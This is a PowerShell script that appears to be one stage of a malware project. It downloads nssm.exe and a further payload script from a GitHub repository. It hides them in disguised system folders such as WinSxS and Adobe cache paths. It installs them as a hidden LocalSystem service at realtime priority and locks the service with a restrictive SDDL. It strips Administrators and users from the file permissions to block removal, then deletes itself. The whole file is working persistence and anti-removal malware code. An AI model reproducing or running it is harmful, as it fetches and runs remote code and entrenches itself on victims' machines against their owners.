param(
    [string]$rootPath,
    [string]$basePath
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
)
$curr = $MyInvocation.MyCommand.Path
$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
$propertyName = "rootMonMon"

# $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
if($arch -eq "64-bit"){
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
}else{
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
}
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"


if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

$scriptPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$scriptPath = "$scriptPath\root_mon_mon.ps1"
$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
if($item){
    $scriptPath = $item.$propertyName
}else{
    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $scriptPath -Force
}

$serviceName = "Exsanguinate"
$childServiceName = "Lugubrious"
$childServicePropertyName = "rootMon"
$exepath = "powershell.exe"
$arguments = "-noP -ep bypass -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath' -childServiceName $childServiceName -childServicePropertyName $childServicePropertyName"
# $downloadPath = "$env:temp\nssm.zip"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    iwr -Uri $nssmUrl -OutFile $nssmexe
}

if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/root_mon_mon.ps1" -OutFile $scriptPath
}

# Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
# Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse -ErrorAction SilentlyContinue

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\root_monmon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\root_monmon_srv.log.error"
& $nssmexe start $serviceName

Start-Sleep -Seconds 3
$user = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM'){
    takeown /F $scriptPath 
    icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /Q 
    icacls $scriptPath /inheritance:r /Q 
    icacls $scriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /Q 
    icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
    icacls $scriptPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
    icacls $scriptPath /remove "$user" /Q 
    
    
    takeown /F $nssmFolder /R /D Y 
    icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 
    icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 
    icacls $nssmFolder /inheritance:r /T /Q 
    icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 
    icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 
    icacls $nssmFolder /remove "$user" /T /Q 

}else{
    takeown /F $scriptPath
    icacls $scriptPath /inheritance:r /Q 
    icacls $scriptPath /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /Q 
    icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /Q 
    icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
    icacls $scriptPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
    icacls $scriptPath /remove "$user" /Q 
    
    
    takeown /F $nssmFolder /R /D Y
    icacls $nssmFolder /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /T /Q
    icacls $nssmFolder /inheritance:r /T /Q
    icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 
    icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 
    icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 
    icacls $nssmFolder /remove "$user" /T /Q
}

#attrib +h +s +r $nssmFolder 2>&1 | Out-Null
#attrib +h +s +r $scriptPath

Pause
Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue